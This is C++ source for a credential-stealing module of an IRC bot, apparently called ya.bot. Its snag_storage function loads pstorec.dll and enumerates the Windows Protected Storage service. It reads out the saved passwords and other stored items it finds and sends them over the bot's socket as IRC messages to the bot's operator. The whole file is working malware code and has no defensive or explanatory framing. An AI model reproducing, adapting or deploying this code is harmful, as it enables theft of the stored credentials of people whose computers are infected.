/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_SNAGSTORAGE

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by Bjoern Stickler
//http://intex.ath.cx/
//botbotbotbotbotbotbotbotbotbotbotbotbot

#import "..\libraries\pstorec.dll"
using namespace PSTORECLib;
typedef HRESULT (WINAPI *PStoreCreateInstancePtr)(IPStore **, DWORD, DWORD, DWORD);

bool snag_storage(SOCKET bsock, char *pszAction, char *pszDestination, bool bSilent, bool bVerbose)
{
	char szBuffer[MEDBUF], *pszData, szString[LOWBUF];
	DWORD dwLength = 0;
	GUID mainGUID, subGUID;
	HMODULE hModule;
	HRESULT hResult;
	IEnumPStoreTypesPtr iepItems, iepMain, iepSub;
	IPStorePtr ipsStore;
	LPWSTR wszItem;
	_PST_PROMPTINFO *pi = NULL;

#ifndef NO_DEBUG
		debug_print("Snagging password storage data, snag_storage()");
#endif

	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_snagstoragegettingpasswordstoragedata,
					CBLUE, string_replysnag, CEND, string_replydotbot);
		hModule = LoadLibrary(string_snagstoragepstorelibrary);
	if (!hModule)
	{
		if ((!bSilent) && (bVerbose))
				irc_message(bsock, pszAction, pszDestination,
						(char *)string_snagendofsnag,
						CBLUE, string_replysnag, CEND, string_replydotbot);
			return FALSE;
	}
		PStoreCreateInstancePtr PStoreCreateInstance =
				(PStoreCreateInstancePtr)GetProcAddress(hModule,
						string_snagstoragepstorefunction);
		hResult = PStoreCreateInstance(&ipsStore, 0, 0, 0);
		hResult = ipsStore->EnumTypes(0, 0, &iepMain);
	while (iepMain->raw_Next(1, &mainGUID, 0) == S_OK)
	{
			_snprintf(szBuffer, sizeof(szBuffer) - 1,
					(char *)string_snagstoragemainguid,
					CGREEN, string_replysnag, CEND, string_replydotbot,
					CBLUE, CEND, mainGUID);
			hResult = ipsStore->EnumSubtypes(0, &mainGUID, 0, &iepSub);
		while (iepSub->raw_Next(1, &subGUID, 0) == S_OK)
		{
				_snprintf(szString, sizeof(szString) - 1,
						(char *)string_snagstoragesubguid,
						subGUID);
				strncat(szBuffer, szString, (sizeof(szBuffer) - strlen(szBuffer)) - 1);
				hResult = ipsStore->EnumItems(0,
						&mainGUID,
						&subGUID,
						0,
						(struct IEnumPStoreItems **)&iepItems);
			while (iepItems->raw_Next(1, (struct _GUID *)&wszItem, 0) == S_OK)
			{
					_snprintf(szString, sizeof(szString) - 1,
							(char *)string_snagstorageitem,
							CBLUE, CEND, wszItem);
					strncat(szBuffer, szString, (sizeof(szBuffer) - strlen(szBuffer)) - 1);
					hResult = ipsStore->raw_ReadItem(0,
							&mainGUID,
							&subGUID,
							wszItem,
							&dwLength,
							(unsigned char **)&pszData,
							pi,
							0);
				if (pszData)
				{
						_snprintf(szString, sizeof(szString) - 1,
								(char *)string_snagstoragedata,
								CBLUE, CEND, pszData);
						strncat(szBuffer, szString, (sizeof(szBuffer) - strlen(szBuffer)) - 1);
						Sleep(FLOOD_DELAY);
					if (!bSilent)
							irc_message(bsock, pszAction, pszDestination, szBuffer);
						Sleep(FLOOD_DELAY);
				}
					break;
			}
		}
	}
	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_snagendofsnag,
					CBLUE, string_replysnag, CEND, string_replydotbot);
		return TRUE;
}
#endif